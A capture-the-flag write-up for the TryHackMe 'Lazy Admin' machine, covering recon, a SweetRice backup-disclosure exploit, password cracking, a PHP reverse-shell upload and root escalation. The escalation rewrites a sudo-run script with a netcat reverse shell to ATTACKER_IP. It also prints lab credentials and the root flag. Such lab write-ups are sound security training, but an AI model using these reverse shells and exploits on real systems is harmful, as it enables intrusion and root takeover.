## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using openvpn to connect to the server. Here's the command:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

Performing some basic `nmap` scans gives us the following information:
```shell-session
$ sudo nmap -sS -vv -oN nmap_scan.txt TARGET_IP
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63


$ sudo nmap -sV -vv -oN nmap_service_scan.txt TARGET_IP
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))

|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.

```

The machine is quite simple in terms of the services running on it, there's a web server and a ssh service running that we can make use of for gaining access and so on. Requesting the web-page for the server running on port 80 shows the default page for _Apache2 Ubuntu_. As dictated by the `vuln` script scan by `nmap`, there's a `/content/` directory that may hold something for us to use...

![](content_folder.png)

Well, sure enough, that _is_ information that interests us. The web page tells us that the web server makes use of `SweetRice`. A quick search using exploitDB shows several vulnerabilities we can use to exploit SweetRice running on the server. The one I'll be using will be the [Backup Disclosure vulnerability in SweetRice 1.5.1](https://www.exploit-db.com/exploits/40718). Visiting the `/content/inc/mysql_backup/` directory gives us access to the SQL backups, which can be downloaded simply by using something like `wget` or just clicking on them. When we view the contents of the `mysql_backup` folder, there's just one file: `mysql_bakup_20191129023059-1.5.1.sql` which can be dowloaded like so:
```shell-session
$ wget http://TARGET_IP/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

Checking the contents of the sql bakcup file provides us the admin username as well as a hashed password to crack:
```txt

  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:

```

Cracking this hash provides us with the password we require:
![](crackstation_pswd.png)


## Gaining Access

After some research and experimentation, we find that the `/as/` page/directory gives us a place to put these credentials to use:
![](login_portal.png)

The credentials to use are: `manager: Password123`. Once logged in, we're taken to a dashboard. We can now make use of one of the exploits we found when searching on ExploitDB. I'll be making use of the [CSRF Vulnerability in SweetRice 1.5.1](https://www.exploit-db.com/exploits/40700). Uploading our reverse shell code as an ad and then requesting the URL: `10.10.42.5/content/inc/ads/payload.php`, we obtain a reverse shell!
```shell-session
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.42.5] 44012

```

And just like that, we've obtained the user flag!

## Privilege Escalation

Now that we have a foothold, we can now go ahead and work on obtaining the root flag. Now, looking at the rest of the files in `/home/itguy` we find 2 interesting ones:
- `mysql_login.txt`
- `backup.pl`

The contents of these are as follows:
```shell-session
www-data@THM-Chal:/home/itguy$ cat mysql_login.txt
rice:randompass

www-data@THM-Chal:/home/itguy$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

Interesting... let's inspect the contents of the `/etc/copy.sh` script.  
```shell-session
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Hmm... it seems like the `/etc/copy.sh` file contains a reverse shell of a sort. Maybe we can leverage that to gain root privileges? Let's try simply replacing the IP `192.168.0.190` with our IP and run a netcat listener at port 5554:

```shell-session
www-data@THM-Chal:/$ cd etc
www-data@THM-Chal:/etc$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 5554 >/tmp/f" > copy.sh

www-data@THM-Chal:/home/itguy$ python -c 'import pty;pty.spawn("/bin/bash")';                             
www-data@THM-Chal:/home/itguy$ cd /
www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl

# On our netcat listener:
$ nc -nvlp 5554
listening on [any] 5554 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.42.5] 49252
# whoami
root
# ls
root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

We have the root flag!
